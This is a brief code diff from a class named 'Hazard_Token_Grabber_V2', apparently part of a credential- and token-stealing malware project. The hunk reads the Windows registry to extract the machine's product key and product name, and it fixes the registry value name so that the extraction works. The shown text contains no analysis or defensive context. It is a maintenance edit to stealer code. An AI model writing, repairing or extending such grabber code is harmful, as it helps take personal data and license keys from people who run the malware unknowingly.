@@ -157,7 +157,7 @@ class Hazard_Token_Grabber_V2:
         wkey = ''
         offset = 52
         regkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
-        val, _ = winreg.QueryValueEx(regkey, 'DigitalProductID')
+        val, _ = winreg.QueryValueEx(regkey, 'DigitalProductId')
         productName, _ = winreg.QueryValueEx(regkey, "ProductName")
         key = list(val)
 
